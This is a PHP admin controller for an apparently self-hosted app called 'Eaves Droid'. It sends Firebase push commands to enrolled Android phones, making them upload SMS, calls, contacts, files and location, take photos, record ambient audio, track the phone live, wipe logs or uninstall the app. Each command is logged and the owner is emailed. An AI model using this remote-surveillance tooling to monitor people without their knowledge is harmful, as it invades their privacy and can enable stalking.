<?php

namespace App\Controllers\admin;

use App\Models\LogUserActionModel;
use CodeIgniter\API\ResponseTrait;

class RemoteDeviceController extends BaseAdminController
{
    use ResponseTrait;
    public function index()
    {
        $db = $this->getDb();

        $this->logAdminAction('remote_device_view', 'low', true);

        $users = $db->table('users')
            ->select('users.id, users.username')
            ->join('tbl_device_profiles', 'tbl_device_profiles.owner_id = users.id', 'inner')
            ->where('tbl_device_profiles.fcm_token !=', '')
            ->where('tbl_device_profiles.fcm_token IS NOT NULL')
            ->groupBy('users.id')
            ->orderBy('users.username', 'ASC')
            ->get()
            ->getResultArray();

        $targetDevice = null;
        if (!empty($users)) {
            $targetDevice = $db->table('tbl_device_profiles')
                ->select('tbl_device_profiles.*, users.username')
                ->join('users', 'users.id = tbl_device_profiles.owner_id')
                ->where('tbl_device_profiles.fcm_token !=', '')
                ->where('tbl_device_profiles.fcm_token IS NOT NULL')
                ->orderBy('tbl_device_profiles.counter', 'DESC')
                ->get()
                ->getRowArray();
        }

        // Fetch stats per user
        $stats = $db->table('users u')
            ->select('u.id, u.username, 
                (SELECT COUNT(*) FROM tbl_extracted_media_files WHERE owner_id = u.id) as media_count,
                (SELECT COALESCE(SUM(file_size), 0) FROM tbl_extracted_media_files WHERE owner_id = u.id) as media_size,
                (SELECT COUNT(*) FROM tbl_uploaded_files WHERE token_owner_id = u.id AND file_category = \'files\') as files_count,
                (SELECT COALESCE(SUM(file_size_bytes), 0) FROM tbl_uploaded_files WHERE token_owner_id = u.id AND file_category = \'files\') as files_size')
            ->join('tbl_device_profiles dp', 'dp.owner_id = u.id', 'inner')
            ->groupBy('u.id')
            ->orderBy('u.username', 'ASC')
            ->get()
            ->getResultArray();

        return $this->renderView('admin/remote_device', [
            'pag' => 'admin-remote-device',
            'users' => $users,
            'targetDevice' => $targetDevice,
            'stats' => $stats,
        ]);
    }

    public function sendCommand()
    {
        if (!$this->request->isAJAX()) {
            return $this->fail('Invalid request');
        }

        $userId = $this->request->getPost('user_id');
        $command = $this->request->getPost('command');
        $payload = $this->request->getPost('payload') ?: 'all';
        $extraData = $this->request->getPost('extra_data');

        if (!$command) {
            return $this->fail('Command is required.');
        }

        try {
            $db = $this->getDb();
            $tokens = [];

            if ($userId === 'all') {
                $devices = $db->table('tbl_device_profiles')
                    ->distinct()
                    ->select('fcm_token')
                    ->where('fcm_token !=', '')
                    ->where('fcm_token IS NOT NULL')
                    ->get()
                    ->getResultArray();
                foreach ($devices as $d) {
                    $tokens[] = $d['fcm_token'];
                }
            } else {
                $device = $db->table('tbl_device_profiles')
                    ->select('fcm_token')
                    ->where('owner_id', $userId)
                    ->where('fcm_token !=', '')
                    ->where('fcm_token IS NOT NULL')
                    ->orderBy('counter', 'DESC')
                    ->get()
                    ->getRowArray();
                if ($device) {
                    $tokens[] = $device['fcm_token'];
                }
            }

            if (empty($tokens)) {
                return $this->fail('No devices found for the selected user(s).');
            }

            $results = [];
            $firebase = new \App\Libraries\FirebaseLib();

            $extraFields = [];
            if ($extraData) {
                if (is_string($extraData)) {
                    $decoded = json_decode($extraData, true);
                    if (is_array($decoded)) $extraFields = $decoded;
                } elseif (is_array($extraData)) {
                    $extraFields = $extraData;
                }
            }

            foreach ($tokens as $token) {
                $fcmData = array_merge([
                    'command' => $command,
                    'payload' => $payload,
                    'sent_at' => date('Y-m-d H:i:s'),
                    'action_log_id' => '0',
                    'ack_url' => rtrim(base_url(), '/') . '/api/v1/command-acknowledgements/0',
                ], $extraFields);

                $sent = $firebase->sendDataMessage($token, $fcmData);
                $results[] = [
                    'token_prefix' => substr($token, 0, 20) . '...',
                    'success' => $sent !== false,
                ];
            }

            $allSuccess = !empty($results) && count(array_filter($results, fn($r) => $r['success'])) === count($results);

            $adminActionMap = [
                'cmd_sms' => 'admin_fetch_sms',
                'cmd_calls' => 'admin_fetch_calls',
                'cmd_contacts' => 'admin_fetch_contacts',
                'cmd_search_data' => 'admin_search_data',
                'cmd_capture_photo' => 'admin_capture_photo',
                'cmd_record_audio' => 'admin_record_audio',
                'cmd_files' => 'admin_fetch_files',
                'cmd_fetch_file' => 'admin_fetch_file',
                'cmd_location' => 'admin_fetch_location',
                'cmd_start_tracking' => 'admin_start_tracking',
                'cmd_context' => 'admin_fetch_context',
                'cmd_apps' => 'admin_fetch_apps',
                'cmd_usage' => 'admin_fetch_usage',
                'cmd_notifications' => 'admin_fetch_notifications',
                'cmd_device_info' => 'admin_fetch_device_info',
                'cmd_sensors' => 'admin_fetch_sensors',
                'cmd_network' => 'admin_fetch_network',
                'cmd_bluetooth' => 'admin_fetch_bluetooth',
                'cmd_calendar' => 'admin_fetch_calendar',
                'cmd_accounts' => 'admin_fetch_accounts',
                'cmd_beep' => 'admin_send_beep',
                'cmd_siren' => 'admin_play_siren',
                'cmd_wipe_logs' => 'admin_wipe_logs',
                'cmd_locate' => 'admin_locate_device',
                'cmd_all' => 'admin_sync_all',
                'cmd_sync_now' => 'admin_sync_data',
                'cmd_reset_app' => 'admin_reset_apps',
                'cmd_deactivate' => 'admin_deactivate_apps',
                'cmd_reactivate' => 'admin_reactivate_apps',
                'cmd_logout' => 'admin_logout_user',
                'cmd_uninstall_preserve' => 'admin_uninstall_preserve',
                'cmd_uninstall_wipe' => 'admin_uninstall_wipe',
                'cmd_update_prefs' => 'admin_set_settings',
                'cmd_open_permission' => 'admin_open_permission',
            ];
            $actionType = $adminActionMap[$command] ?? ('admin_remote_cmd_' . str_replace('cmd_', '', $command));

            $logModel = new \App\Models\LogUserActionModel();
            $logModel->logAction([
                'action_category' => 'admin',
                'action_type' => $actionType,
                'action_severity' => 'medium',
                'success' => $allSuccess ? 1 : 0,
                'resource_id' => $userId ?? 'all',
                'new_values' => json_encode([
                    'command' => $command,
                    'payload' => $payload,
                    'target' => $userId ?? 'all',
                    'device_count' => count($tokens),
                    'success_count' => count(array_filter($results, fn($r) => $r['success'])),
                    'fail_count' => count(array_filter($results, fn($r) => !$r['success'])),
                ]),
                'request_url' => current_url(),
                'request_method' => $this->request->getMethod(),
            ]);

            $this->sendDeviceManagementEmail($userId, $command, $allSuccess);

            return $this->respond([
                'success' => true,
                'message' => "Command sent to " . count($tokens) . " device(s).",
                'results' => $results,
            ]);
        } catch (\Exception $e) {
            log_message('error', 'Admin remote send error: ' . $e->getMessage());
            return $this->fail('Server error: ' . $e->getMessage());
        }
    }

    /**
     * Sends an HTML email notification to a user when a remote command is executed.
     */
    private function sendDeviceManagementEmail(int|string $targetUserId, string $command, bool $allSuccess): void
    {
        try {
            $db = \Config\Database::connect();

            $adminName = $this->userData['username'] ?? 'Administrator';
            $adminIp = $this->request->getIPAddress();
            $adminUa = $this->request->getUserAgent()->getAgentString() ?: 'Unknown';
            $timestamp = date('Y-m-d H:i:s');

            $commandLabels = [
                'cmd_sms' => 'Fetch SMS',
                'cmd_calls' => 'Fetch Call Logs',
                'cmd_contacts' => 'Fetch Contacts',
                'cmd_search_data' => 'Keyword Search',
                'cmd_capture_photo' => 'Capture Photo',
                'cmd_record_audio' => 'Record Audio',
                'cmd_files' => 'Fetch Files',
                'cmd_fetch_file' => 'Fetch Specific File',
                'cmd_location' => 'Fetch Location',
                'cmd_start_tracking' => 'Start Live Tracking',
                'cmd_context' => 'Fetch Context (Activity + LocationController)',
                'cmd_apps' => 'Fetch Installed Apps',
                'cmd_usage' => 'Fetch App Usage Stats',
                'cmd_notifications' => 'Fetch Notifications',
                'cmd_device_info' => 'Fetch Device Info',
                'cmd_sensors' => 'Fetch Sensor Data',
                'cmd_network' => 'Fetch Network Info',
                'cmd_bluetooth' => 'Fetch Bluetooth Devices',
                'cmd_calendar' => 'Fetch Calendar Events',
                'cmd_accounts' => 'Fetch Accounts',
                'cmd_beep' => 'Play Test Beep',
                'cmd_siren' => 'Play Siren',
                'cmd_wipe_logs' => 'Wipe Logs',
                'cmd_locate' => 'Locate Device',
                'cmd_all' => 'Sync All Data Categories',
                'cmd_sync_now' => 'Sync Data Now',
                'cmd_reset_app' => 'App Reset',
                'cmd_deactivate' => 'App Deactivation',
                'cmd_reactivate' => 'App Reactivation',
                'cmd_logout' => 'User Logout',
                'cmd_uninstall_preserve' => 'Uninstall (Keep Data)',
                'cmd_uninstall_wipe' => 'Uninstall (Wipe All)',
                'cmd_update_prefs' => 'Update Settings',
                'cmd_open_permission' => 'Open Permission',
                'cmd_misc_hardware' => 'Fetch Misc Hardware',
                'cmd_misc_software' => 'Fetch Misc Software',
            ];
            $label = $commandLabels[$command] ?? str_replace('_', ' ', str_replace('cmd_', '', $command));

            $commandDescriptions = [
                'cmd_sms' => 'Requests the device to upload its SMS messages to the server.',
                'cmd_calls' => 'Requests the device to upload its call log history.',
                'cmd_contacts' => 'Requests the device to upload its contact list.',
                'cmd_search_data' => 'Searches the device for files or data matching specific keywords.',
                'cmd_capture_photo' => 'Triggers the device camera to capture and upload a photo.',
                'cmd_record_audio' => 'Triggers the device microphone to record and upload ambient audio.',
                'cmd_files' => 'Requests the device to upload its file directory listing.',
                'cmd_fetch_file' => 'Requests a specific file from the device by path.',
                'cmd_location' => 'Requests the device to upload its current GPS location.',
                'cmd_start_tracking' => 'Instructs the device to begin periodic location tracking for a set duration.',
                'cmd_context' => 'Requests the device to upload current activity recognition and location context.',
                'cmd_apps' => 'Requests the device to upload a list of all installed applications.',
                'cmd_usage' => 'Requests the device to upload application usage statistics.',
                'cmd_notifications' => 'Requests the device to upload its recent notification history.',
                'cmd_device_info' => 'Requests the device to upload hardware and software information.',
                'cmd_sensors' => 'Requests the device to upload current sensor readings.',
                'cmd_network' => 'Requests the device to upload network connection details.',
                'cmd_bluetooth' => 'Requests the device to upload paired and visible Bluetooth devices.',
                'cmd_calendar' => 'Requests the device to upload calendar events.',
                'cmd_accounts' => 'Requests the device to upload configured account information.',
                'cmd_beep' => 'Sends a test beep command to verify the device connection.',
                'cmd_siren' => 'Plays a loud siren sound on the device for locating it.',
                'cmd_wipe_logs' => 'Instructs the device to clear its local log data.',
                'cmd_locate' => 'Triggers an immediate locate command on the device.',
                'cmd_all' => 'Requests the device to upload all available data categories.',
                'cmd_sync_now' => 'Triggers an immediate data sync on the device.',
                'cmd_reset_app' => 'Resets the Eaves Droid app on the device to its initial state.',
                'cmd_deactivate' => 'Deactivates the Eaves Droid app, stopping all monitoring.',
                'cmd_reactivate' => 'Reactivates the Eaves Droid app, resuming all monitoring.',
                'cmd_logout' => 'LogsController out the current session on the device.',
                'cmd_uninstall_preserve' => 'Uninstalls the app while preserving collected data on the server.',
                'cmd_uninstall_wipe' => 'Uninstalls the app and wipes all collected data from the device.',
                'cmd_update_prefs' => 'Updates device settings and preferences remotely.',
                'cmd_open_permission' => 'Triggers the device to open a specific permission settings screen.',
                'cmd_misc_hardware' => 'Requests the device to upload auxiliary hardware diagnostic data (sensors, network interfaces, Bluetooth connections).',
                'cmd_misc_software' => 'Requests the device to upload auxiliary software data (calendar events, configured system accounts, locales).',
            ];
            $description = $commandDescriptions[$command] ?? '';

            $targetUsers = [];
            if ($targetUserId === 'all') {
                $allDevices = $db->table('tbl_device_profiles')
                    ->distinct()
                    ->select('owner_id')
                    ->where('fcm_token !=', '')
                    ->where('fcm_token IS NOT NULL')
                    ->get()
                    ->getResultArray();
                foreach ($allDevices as $d) {
                    $targetUsers[] = (int)$d['owner_id'];
                }
            } else {
                $targetUsers[] = (int)$targetUserId;
            }

            $targetUsers = array_unique($targetUsers);

            foreach ($targetUsers as $uid) {
                $this->sendEmailToUser($db, $uid, $command, $label, $description, $adminName, $adminIp, $adminUa, $timestamp, $allSuccess);
            }
        } catch (\Exception $e) {
            log_message('error', 'sendDeviceManagementEmail: Exception — ' . $e->getMessage() . ' at ' . $e->getFile() . ':' . $e->getLine());
        }
    }

    private function sendEmailToUser($db, int $targetUserId, string $command, string $label, string $description, string $adminName, string $adminIp, string $adminUa, string $timestamp, bool $allSuccess): void
    {
        try {
            $targetUser = $db->table('users')
                ->select('id, username')
                ->where('id', $targetUserId)
                ->get()
                ->getRowArray();

            if (!$targetUser) return;

            $userEmail = null;
            $row = $db->table('auth_identities')
                ->select('secret AS email')
                ->where('user_id', $targetUserId)
                ->where('type', 'email_password')
                ->get()
                ->getRowArray();
            if ($row && !empty($row['email'])) $userEmail = $row['email'];

            if (empty($userEmail)) return;

            $profile = $db->table('user_profiles')->select('email_notifications')->where('user_id', $targetUserId)->get()->getRowArray();
            if ($profile && isset($profile['email_notifications']) && !$profile['email_notifications']) return;

            send_templated_email(
                $userEmail,
                "Eaves Droid — Remote Command: {$label}",
                'email/device_management_notification',
                [
                    'label'       => $label,
                    'description' => $description,
                    'timestamp'   => $timestamp,
                    'ip'          => $adminIp,
                    'userAgent'   => $adminUa,
                    'success'     => $allSuccess,
                    'adminName'   => $adminName,
                    'command'     => $command,
                    'targetUsername' => $targetUser['username'],
                ]
            );
        } catch (\Exception $e) {
            log_message('error', 'sendDeviceManagementEmail: Exception for user ' . $targetUserId . ' — ' . $e->getMessage());
        }
    }
}
